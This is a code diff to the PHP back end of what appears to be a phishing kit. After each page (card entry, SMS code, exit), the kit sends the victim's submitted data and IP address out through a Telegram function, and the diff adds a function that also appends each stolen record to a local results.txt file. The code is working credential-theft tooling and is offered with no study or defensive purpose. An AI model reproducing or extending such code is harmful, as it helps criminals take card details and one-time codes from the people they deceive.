@@ -21,6 +21,12 @@ function sendTotelegram($data){
 
 }
 
+function appendResult($data) {
+    $file = __DIR__ . '/results.txt';
+    $entry = '[' . date('Y-m-d H:i:s') . "]\n" . $data . "\n\n";
+    file_put_contents($file, $entry, FILE_APPEND);
+}
+
 function isAjaxRequest() {
     return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
 }
@@ -80,6 +86,7 @@ IP: $ip
 ";
 
 sendTotelegram($msg);
+appendResult($msg);
 
 if (isAjaxRequest()) {
     header('Content-Type: application/json');
@@ -118,6 +125,7 @@ IP: $ip
 
 
 sendTotelegram($msg);
+appendResult($msg);
 
 header("location: card.php");
 
@@ -141,9 +149,10 @@ IP: $ip
 ";
 
 sendTotelegram($msg);
+appendResult($msg);
 
 header("location: wait.php?next=sms.php");
-    
+
 }
     
 
@@ -160,6 +169,7 @@ IP: $ip
 ";
 
 sendTotelegram($msg);
+appendResult($msg);
 
 if(isset($_POST['exit'])){
     die(header("location: exit.php"));
